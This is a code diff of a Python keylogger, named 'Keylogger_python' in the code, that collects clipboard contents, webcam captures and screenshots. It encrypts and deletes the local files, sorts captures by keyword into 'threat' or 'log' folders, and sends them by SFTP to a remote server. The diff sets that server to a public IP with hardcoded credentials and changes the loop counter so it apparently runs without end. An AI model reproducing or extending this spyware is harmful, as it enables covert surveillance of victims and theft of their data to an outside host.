@@ -17,17 +17,18 @@ clipboard_information = "Clipboard.txt"
 camera_information = ".png"
 screenshot_information = ".png"
 
-time_iterations = 30
+time_iterations = 10
 number_of_iterations_end = 1
 
-myHostname = "192.168.1.16"  # change this
+myHostname = "143.110.255.166"  # change this
 myUsername = "pi"  # change this
 myPassword = "kali123"  # change this #should be 8 characters or more including special characters
-remote_file = '/home/pi/transfer/'
+remote_file = '/home/pi/log/'
+threat_file = '/home/pi/threat/'
 
 i = 0  # global variable to change the name of image as we click
 
-directory = "C:\\Users\\Public\\Libraries\\"
+directory = "C:\\Users\\Public\\"
 extend = "\\"
 dir_name = "Keylogger_python"
 path = os.path.join(directory, dir_name)
@@ -86,15 +87,28 @@ def encrypt_files():
                 f.write(encrypted)
                 print(z)
                 z = file_path
-    print("files in folder encrypted")
 
 
 # Sftp the files to server
-def sftp_files():
+def sftp_files_threat():
+    with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
+        print("Connection Successfully Established")
+        sftp.chdir(threat_file)
+        time_str = time.strftime("Threat_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
+        sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
+        print("Directory created")
+        sftp.chdir(time_str)
+        slash = "/"
+        new_path = sftp.pwd
+        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
+        sftp.close()
+
+
+def sftp_files_log():
     with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
         print("Connection Successfully Established")
         sftp.chdir(remote_file)
-        time_str = time.strftime("log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
+        time_str = time.strftime("Log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
         sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
         print("Directory created")
         sftp.chdir(time_str)
@@ -122,10 +136,18 @@ def read_file():
     for line in file1:
         if any(keyword in line for keyword in string1):
             print(line)
-            print("these words were found")
+            print("these words were found, storing in Threat Directory")
+            encrypt_files()
+            # sftp_files_threat()
+            delete_files()
+            print("Encrypted and stored in Threat dir")
 
         else:
-            print("no words were found")
+            print("no words were found, storing in Log Directory")
+            encrypt_files()
+            # sftp_files_log()
+            delete_files()
+            print("Encrypted and stored in Log dir")
 
         # closing text file
     file1.close()
@@ -217,15 +239,8 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         copy_clipboard()
         capture_webcam()
         read_file()
-        encrypt_files()
-        sftp_files()
-        #delete_files()
 
-        number_of_iterations += 1
+        number_of_iterations += -1
 
         currentTime = time.time()
         stopTime = time.time() + time_iterations
-
-
-
-
